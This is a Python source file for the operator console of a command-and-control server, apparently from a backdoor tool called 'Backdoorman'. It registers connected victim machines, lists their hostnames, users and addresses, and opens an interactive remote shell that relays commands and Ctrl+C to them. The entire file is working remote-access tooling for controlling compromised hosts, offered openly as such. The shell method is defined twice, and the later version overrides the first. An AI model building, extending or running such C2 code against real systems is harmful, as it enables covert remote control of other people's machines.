import logging
import os
import threading
import sys
import shlex
from typing import Dict, Optional, List, Any
import json
import time
import signal
import readline
from .banner import BackdoormanBanner
from ..session.client_session import ClientSession
from ..utils.file_transfer import FileTransfer

logger = logging.getLogger('c2.cli')

class CommandHandler:
    """CLI interface for C2 server"""
    
    def __init__(self, config: dict):
        self.config = config
        self.clients: Dict[str, ClientSession] = {}
        self.current_client_id = None
        self.running = False
        self.file_transfer = FileTransfer(config.get('download_dir', 'data/downloads'))
        self.in_shell = False  # Add this flag to track shell mode
        self.original_sigint = None  # Store original signal handler
        

    def _interactive_shell(self):
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return

        print(f"\nEntering interactive shell with {client}")
        print("Type 'exit' to return to the C2 console\n")

        # No signal handler swapping needed
        self.in_shell = True
        
        try:
            while self.in_shell and client.is_active:
                try:
                    if not client.channel or not client.channel.active:
                        print("\nShell connection lost")
                        break

                    cmd = input()

                    if cmd == '\x03':
                        if client.pty_enabled:
                            client.channel.send(b'\x03')
                        continue

                    if cmd.strip() == '':
                        cmd = '\n'

                    response = client.send_command(cmd)
                    if response:
                        print(response, end='', flush=True)

                except KeyboardInterrupt:
                    if client.pty_enabled:
                        client.channel.send(b'\x03')
                    print()
                    continue
                except EOFError:
                    break
                    
        finally:
            self.in_shell = False
            print(f"\n{self._get_prompt()}", end="", flush=True)

    def start(self):
        """Start the command interface"""
        def main_sigint_handler(signum, frame):
            """Main console signal handler"""
            if not self.in_shell:
                print("\nUse 'quit' to quit")
            
        # Set up main console signal handler
        signal.signal(signal.SIGINT, main_sigint_handler)
        
        self.running = True
        logger.info("Command interface started")
        
        BackdoormanBanner.display()
        print("\nC2 Server Command Interface")
        print("Type 'help' for available commands")
        
        while self.running:
            try:
                cmd_line = input(self._get_prompt())
                if not cmd_line.strip():
                    continue
                    
                self._process_command(cmd_line)
                    
            except KeyboardInterrupt:
                continue  # Handled by signal handler
            except EOFError:
                print("\nExiting command interface")
                self.running = False
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                print(f"Error: {str(e)}")
    
    def stop(self):
        """Stop the command interface"""
        self.running = False
        
    def register_client(self, client: ClientSession):
        """Register a new client"""
        self.clients[client.id] = client
        
        # If this is the first client, make it the current one
        if not self.current_client_id:
            self.current_client_id = client.id
            
        # Notify about new client
        print(f"\nNew client connected: {client}")
        print(f"{self._get_prompt()}", end="", flush=True)

    def _disconnect_client(self, client_selector: str):
        """Disconnect a client and remove it from the list"""
        # Try to interpret as index first
        try:
            idx = int(client_selector)
            if idx < 0 or idx >= len(self.clients):
                print(f"Invalid client index: {idx}")
                return
            client_id = list(self.clients.keys())[idx]
        except ValueError:
            # If not a number, use as client ID
            client_id = client_selector

        if client_id not in self.clients:
            print(f"Client not found: {client_selector}")
            return

        client = self.clients[client_id]
        if client.disconnect():
            self._remove_client(client_id)
            print(f"Client {client_id} disconnected and removed")
        else:
            print(f"Error disconnecting client {client_id}")


    
    def _get_prompt(self):
        """Get the command prompt string"""
        if self.current_client_id and self.current_client_id in self.clients:
            client = self.clients[self.current_client_id]
            return f"c2({client.hostname})> "
        return "c2> "
    

    def _process_command(self, cmd_line: str):
        """Process a command line input"""
        # Split the command with proper handling of quotes
        try:
            args = shlex.split(cmd_line)
        except Exception:
            args = cmd_line.split()
            
        if not args:
            return
            
        cmd = args[0].lower()
        
        # Local commands
        if cmd == "quit":
            print("Exiting command interface (server continues running)")      
            self.running = False
            
        if cmd == "help":
            self._show_help()
            
        elif cmd == "clients":
            self._list_clients()
            
        elif cmd == "use":
            if len(args) < 2:
                print("Usage: use <client_id>")
                return
            self._switch_client(args[1])
            
        elif cmd == "info":
            self._show_client_info()
        
           
        elif cmd == "disconnect":
            if len(args) < 2:
                print("Usage: disconnect <client_id>")
                return
            self._disconnect_client(args[1])
            
        elif cmd == "shell":
            self._interactive_shell()
            
        # Send command to client
        else:
            pass
    
    def _show_help(self):
        """Show help message"""
        print("\nAvailable commands:")
        print("  clients                    - List all connected clients")
        print("  use <id>                   - Switch to a specific client")
        print("  info                       - Show detailed info about current client")
        print("  shell                      - Enter interactive shell mode with current client")
        print("  disconnect <id>            - Disconnect and remove a client")
        print("  quit                       - Exit the command interface")
        print("  help                       - Show this help message")
        print("  <command>                  - Send a command to the current client")
    
    def _list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print("No clients connected")
            return
            
        print("\nConnected clients:")
        print("-" * 70)
        print(f"{'ID':<4} {'Host':<15} {'User':<10} {'Address':<20} {'Transport':<8} {'Active'}")
        print("-" * 70)
        
        for i, (client_id, client) in enumerate(self.clients.items()):
            current = "*" if client_id == self.current_client_id else " "
            addr = f"{client.addr[0]}:{client.addr[1]}"
            status = "Yes" if client.is_active else "No"
            print(f"{current}{i:<3} {client.hostname:<15} {client.username:<10} {addr:<20} {client.transport_type:<8} {status}")
        print("-" * 70)
    
    def _switch_client(self, client_selector: str):
        """Switch the current client"""
        # Try to interpret as index first
        try:
            idx = int(client_selector)
            if idx < 0 or idx >= len(self.clients):
                print(f"Invalid client index: {idx}")
                return
                
            client_id = list(self.clients.keys())[idx]
            self.current_client_id = client_id
            client = self.clients[client_id]
            print(f"Switched to {client}")
            return
        except ValueError:
            pass
            
        # Try as client ID
        if client_selector in self.clients:
            self.current_client_id = client_selector
            client = self.clients[client_selector]
            print(f"Switched to {client}")
            return
            
        print(f"Client not found: {client_selector}")
    
    def _show_client_info(self):
        """Show detailed information about the current client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        info = client.to_dict()
        
        print("\nClient Information:")
        print("-" * 50)
        print(f"ID:           {info['id']}")
        print(f"Hostname:     {info['hostname']}")
        print(f"Username:     {info['username']}")
        print(f"OS:           {info['os_type']}")
        print(f"Address:      {info['addr']}")
        print(f"Transport:    {info['transport']}")
        print(f"Active:       {info['active']}")
        print(f"Connected:    {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info['connect_time']))}")
        print(f"Last seen:    {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info['last_seen']))}")
        print(f"Uptime:       {info['uptime']} seconds")
        
        if info['capabilities']:
            print(f"Capabilities: {', '.join(info['capabilities'])}")
        print("-" * 50)


    def _remove_client(self, client_id: str):
        """Remove a client from the list"""
        if client_id in self.clients:
            del self.clients[client_id]
            print(f"Client {client_id} removed")
        else:
            print(f"Client {client_id} not found")
        # If the removed client was the current one, reset current client
        if self.current_client_id == client_id:
            self.current_client_id = None
            print("Current client reset to None")
        # Notify about client removal
        print(f"Client {client_id} disconnected")
        print(f"{self._get_prompt()}", end="", flush=True)

    
    def _send_command(self, command: str) -> Optional[str]:
        """Send a command to the current client"""
        if not self.current_client_id:
            print("No client selected")
            return None
            
        if self.current_client_id not in self.clients:
            print("Selected client no longer connected")
            return None
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return None
            
        try:
            return client.send_command(command)
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            print(f"Error: {str(e)}")
            return None
    

    def _interactive_shell(self):
        """Enter an interactive shell with the current client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return

        def shell_sigint_handler(signum, frame):
            if client.pty_enabled and client.channel and client.channel.active:
                try:
                    client.channel.send(b'\x03')
                except Exception as e:
                    logger.error(f"Error sending Ctrl+C: {e}")

        print(f"\nEntering interactive shell with {client}")
        print("Type 'quit' to return to the C2 console\n")
        
        self.in_shell = True
        original_sigint = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, shell_sigint_handler)
        
        
        try:
            while self.in_shell and client.is_active:
                try:
                    if not client.channel or not client.channel.active:
                        print("\nShell connection lost")
                        break
                        
                    cmd = input("")
                    
                    
                    if cmd.lower() == "quit":
                        print("Returning to C2 console")
                        break

                    elif cmd.strip() == '':
                        cmd = '\n'
                        
                    response = client.send_command(cmd)
                    if response:
                        print(response, end='', flush=True)
                        
                except KeyboardInterrupt:
                    print()  # Clean newline
                    break
                except EOFError:
                    print("\nExiting shell")
                    break
                except Exception as e:
                    logger.error(f"Shell error: {e}")
                    print(f"Error: {str(e)}")
                    break
        finally:
            signal.signal(signal.SIGINT, original_sigint)
            self.in_shell = False
            print(f"\n", end="", flush=True)
    